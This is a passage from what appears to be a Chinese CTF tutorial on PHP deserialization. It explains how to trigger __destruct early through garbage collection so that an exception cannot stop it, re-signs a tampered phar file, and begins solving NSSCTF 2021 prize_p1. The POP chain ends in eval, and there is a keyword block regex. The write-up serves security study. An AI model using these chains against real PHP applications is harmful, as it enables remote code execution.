&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 1__construct&amp;lt;/br&amp;gt;2__construct&amp;lt;/br&amp;gt;3__construct&amp;lt;/br&amp;gt;3__destruct&amp;lt;/br&amp;gt;2__destruct&amp;lt;/br&amp;gt;1__destruct&amp;lt;/br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>————很好理解：无变量指向的new的对象创建后即回收，有指向的按创建时间倒序回收（先创建的最后回收&lt;/p>
&lt;p>问题的关键在于可能来搅局的&lt;code>throw new Exception();&lt;/code>，比如&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;xxx&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在这种情况下程序异常报错退出，我们pop链中重要的&lt;code>__destruct&lt;/code>不会执行（它在对象正常销毁时被执行），比如一个很简单的pop链&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">errorr0&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$num&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;hello __destruct&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">num&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">errorr1&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;hello __toString&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">errorr2&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;hello __flag()&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">errorr0&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">errorr1&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">errorr2&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e3&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;phpinfo();&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e2&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$e3&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e1&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$e2&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$e1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// O:7:&amp;#34;errorr0&amp;#34;:1:{s:3:&amp;#34;num&amp;#34;;O:7:&amp;#34;errorr1&amp;#34;:1:{s:3:&amp;#34;err&amp;#34;;O:7:&amp;#34;errorr2&amp;#34;:1:{s:3:&amp;#34;err&amp;#34;;s:10:&amp;#34;phpinfo();&amp;#34;;}}}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果我们向最后一行的unserialize之后再添加&lt;code>throw new Exception&lt;/code>，我们会发现原来的phpinfo界面立刻就会消失，阻止&lt;code>__destruct&lt;/code>的执行&lt;/p>
&lt;p>针对这种情况，我们选择将对象插在有&lt;code>NULL&lt;/code>元素的数组中&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">errorr0&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">errorr1&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">errorr2&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e3&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;phpinfo();&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e2&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$e3&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e1&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$e2&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#111">$e1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#00a8c8">NULL&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// a:2:{i:0;O:7:&amp;#34;errorr0&amp;#34;:1:{s:3:&amp;#34;num&amp;#34;;O:7:&amp;#34;errorr1&amp;#34;:1:{s:3:&amp;#34;err&amp;#34;;O:7:&amp;#34;errorr2&amp;#34;:1:{s:3:&amp;#34;err&amp;#34;;s:10:&amp;#34;phpinfo();&amp;#34;;}}}i:1;N;}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// a:2:{i:0;O:7:&amp;#34;errorr0&amp;#34;:1:{s:3:&amp;#34;num&amp;#34;;O:7:&amp;#34;errorr1&amp;#34;:1:{s:3:&amp;#34;err&amp;#34;;O:7:&amp;#34;errorr2&amp;#34;:1:{s:3:&amp;#34;err&amp;#34;;s:10:&amp;#34;phpinfo();&amp;#34;;}}}i:0;N;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而直接serialize($c)的结果也无法达到预期，数组中i=0是我们的对象，i=1是NULL，我们手动把i:1改为i:0，也就是改为NULL 让其失去引用，提前GC触发&lt;code>__destruct&lt;/code>&lt;/p>
&lt;h3 id="phar中的应用">phar中的应用&lt;/h3>
&lt;p>而这种改动在phar中会造成签名错误（phpstorm会无法再识别），需要重新生成签名（不过依旧无法识别）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">hashlib&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sha1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;arsenetang.phar&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;rb&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">28&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># 读取开始到末尾除签名外内容&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">last&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">:]&lt;/span> &lt;span style="color:#75715e"># 读取最后8位的GBMB和签名flag&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">new_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sha1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digest&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">last&lt;/span> &lt;span style="color:#75715e"># 生成新的文件内容 此时sha1正确&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;change.phar&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;wb&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">new_file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nssctf-2021prize_p1">[NSSCTF 2021]prize_p1&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">getflag&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// echo getenv(&amp;#34;FLAG&amp;#34;); // 目标
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag{111}&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 本地测试
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">// 传入phar内容
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/get|flag|post|php|filter|base64|rot13|read|data/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;我知道你想干吗，我的建议是不要那样做。&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./tmp/a.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 传入phar内容
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">// 文件路径
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/get|flag|post|php|filter|base64|rot13|read|data/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;我知道你想干吗，我的建议是不要那样做。&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// phar触发反序列化
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/get|flag|post|php|filter|base64|rot13|read|data/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;我知道你想干吗，我的建议是不要那样做。&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// 传入A的序列化
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;那么就从这里开始起航吧&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 需绕 数组+i:0
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于A，写入&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// O:1:&amp;#34;A&amp;#34;:{s:6:&amp;#34;config&amp;#34;;s:1:&amp;#34;w&amp;#34;;}
